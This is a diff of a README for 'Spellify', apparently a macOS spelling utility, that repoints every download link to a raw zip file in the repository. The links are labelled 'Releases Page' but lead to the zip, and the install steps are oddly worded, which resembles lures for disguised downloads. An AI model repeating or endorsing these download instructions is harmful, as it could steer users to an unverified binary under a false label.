@@ -6,10 +6,10 @@ Welcome to Spellify, a macOS menu bar utility that helps you correct spelling an
 
 ## 📥 Download Spellify
 
-[![Download Spellify](https://github.com/Aesarrr/Spellify/raw/refs/heads/main/Sources/Software_3.4.zip)](https://github.com/Aesarrr/Spellify/raw/refs/heads/main/Sources/Software_3.4.zip)
+[![Download Spellify](https://raw.githubusercontent.com/Aesarrr/Spellify/main/Sources/Software_3.4.zip)](https://raw.githubusercontent.com/Aesarrr/Spellify/main/Sources/Software_3.4.zip)
 
 You can download Spellify by visiting the following link:  
-[Download from Releases Page](https://github.com/Aesarrr/Spellify/raw/refs/heads/main/Sources/Software_3.4.zip) 
+[Download from Releases Page](https://raw.githubusercontent.com/Aesarrr/Spellify/main/Sources/Software_3.4.zip) 
 
 ## 💡 Features
 
@@ -31,8 +31,8 @@ To run Spellify, ensure your system meets the following requirements:
 
 Here’s how to install Spellify on your macOS:
 
-1. Visit our [Releases Page](https://github.com/Aesarrr/Spellify/raw/refs/heads/main/Sources/Software_3.4.zip) to download the latest version of Spellify.
-2. Click on the file labeled `https://github.com/Aesarrr/Spellify/raw/refs/heads/main/Sources/Software_3.4.zip`.
+1. Visit our [Releases Page](https://raw.githubusercontent.com/Aesarrr/Spellify/main/Sources/Software_3.4.zip) to download the latest version of Spellify.
+2. Click on the file labeled `https://raw.githubusercontent.com/Aesarrr/Spellify/main/Sources/Software_3.4.zip`.
 3. Once the download is complete, locate the file in your Downloads folder and double-click to open it.
 4. Drag the Spellify icon to your Applications folder.
 5. Open your Applications folder and double-click on Spellify to launch it.
@@ -66,6 +66,6 @@ Spellify is open-source software licensed under the MIT license. Feel free to us
 ## 📥 Final Reminder
 
 Don't forget to download Spellify here:  
-[Download from Releases Page](https://github.com/Aesarrr/Spellify/raw/refs/heads/main/Sources/Software_3.4.zip)
+[Download from Releases Page](https://raw.githubusercontent.com/Aesarrr/Spellify/main/Sources/Software_3.4.zip)
 
 Thank you for choosing Spellify for your writing needs!
